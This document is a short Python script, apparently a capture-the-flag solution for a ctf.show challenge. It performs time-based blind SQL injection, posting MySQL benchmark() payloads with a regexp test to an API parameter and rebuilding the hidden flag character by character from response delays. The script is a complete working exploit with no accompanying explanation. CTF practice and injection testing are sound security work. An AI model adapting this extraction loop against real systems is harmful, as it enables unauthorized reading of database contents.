from time import time
from requests import post
from string import ascii_lowercase, digits

url = 'http://fb53b2b7-a13f-4f7f-a62b-25f68028afaa.challenge.ctf.show/api/'
flag = 'ctfshow{'
payload = 'benchmark(if((select flagaabc from ctfshow_flagxccb) regexp \'{}\', 1000000, 1), md5(1))'

while True:
    for char in ascii_lowercase + digits + '-}':
        start = time()
        post(url, {'ip': payload.format(flag + char), 'debug': '1'})
        end = time()
        if end - start > 0.5:
            flag += char
            print(flag)
            if char == '}':
                exit()
            break
